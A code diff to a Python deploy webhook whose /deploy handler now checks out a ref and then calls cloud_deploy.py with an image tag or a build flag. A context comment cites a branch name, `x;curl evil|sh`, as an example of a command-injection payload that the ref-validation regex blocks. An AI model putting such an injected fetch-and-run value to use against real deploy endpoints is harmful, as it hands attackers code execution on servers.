@@ -3,7 +3,7 @@
 
 Listens on 0.0.0.0 so Docker bridge networks can reach it.
 Authenticated endpoints:
-  POST /deploy   — git pull + docker compose up -d --build
+  POST /deploy   — check out a ref, then cloud_deploy.py (pull or build, start)
   GET  /versions — list available release tags
   GET  /log      — stream output of the last deploy
 
@@ -120,6 +120,9 @@ class Handler(http.server.BaseHTTPRequestHandler):
         self._reply(200, b"deploy started")
 
         extra_refs, _ = _update_config()
+        # What cloud_deploy.py brings the containers to: the image tag CI published
+        # for this ref, or `--build` for a branch, which has none.
+        image = "master"
         if version == "master":
             cmd = f"cd {REPO} && git fetch origin && git reset --hard origin/master"
         elif version in extra_refs and _REF_RE.match(version):
@@ -129,10 +132,12 @@ class Handler(http.server.BaseHTTPRequestHandler):
             # about its shape — a branch named `x;curl evil|sh` would be a command,
             # not a ref. _REF_RE is what makes it safe to interpolate.
             cmd = f"cd {REPO} && git fetch origin && git reset --hard origin/{version}"
+            image = "--build local-" + version.replace("/", "-")
         elif _VERSION_RE.match(version):
             # A specific release tag. `version` is validated against _VERSION_RE,
             # so it is safe to interpolate into the shell command.
             cmd = f"cd {REPO} && git fetch --tags && git checkout -B release {version}"
+            image = version
         else:
             # 'latest' (or anything unrecognised) → newest release tag.
             cmd = (
@@ -140,16 +145,12 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 f"LATEST=$(git tag -l --sort=-version:refname | grep -E '^v[0-9]{{4}}\\.[0-9]{{2}}\\.[0-9]+$' | head -1) && "
                 f'if [ -n "$LATEST" ]; then git checkout -B release "$LATEST"; else git fetch origin && git reset --hard origin/master; fi'
             )
-        # Size the worker set for this machine first (cloud_workers.py), so a resized
-        # VPS takes effect on the next deploy; `--remove-orphans` stops workers the
-        # set no longer has. Caddy is reloaded, not restarted, for the new routes:
-        # a reload keeps every open socket.
-        cmd += (
-            f" && cd {REPO}/cloud && python3 cloud_workers.py"
-            " && docker compose up -d --build --remove-orphans"
-            " && docker compose exec -T caddy caddy reload"
-            " --config /etc/caddy/Caddyfile --adapter caddyfile"
-        )
+            image = '"${LATEST:-master}"'
+        # cloud_deploy.py sizes the worker set for this machine (a resized VPS takes
+        # effect on the next deploy), pulls the image — or builds it when there is
+        # none — starts the containers with `--remove-orphans`, and reloads Caddy:
+        # a reload, not a restart, keeps every open socket.
+        cmd += f" && cd {REPO}/cloud && python3 cloud_deploy.py {image}"
 
         _run_deploy(cmd)
 
